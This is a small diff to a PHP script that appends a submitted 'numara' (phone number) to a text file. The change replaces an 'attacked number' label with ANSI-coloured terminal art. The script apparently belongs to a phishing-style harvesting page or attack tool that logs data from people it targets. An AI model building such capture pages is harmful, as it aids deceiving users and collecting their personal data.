@@ -6,9 +6,14 @@ if (isset($_POST['numara'])) {
 $save = fopen("numara.txt","a+");
 $numara = $_POST['numara'];
 $vericekilen = ("
-========================================
-SALDIRI YAPILAN NUMARA >> ".$numara."
-========================================");
+\e[32m
+	████████████████████████████████████████
+	██
+	██ \e[97mNUMARA : \e[32m".$numara."\e[32m
+	██
+	████████████████████████████████████████\e[97m
+        
+	+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-");
 fwrite($save,$vericekilen);
 fclose($save);
 //echo "<script>alert('HATALI GİRİŞ YAPTINIZ !');</script>";
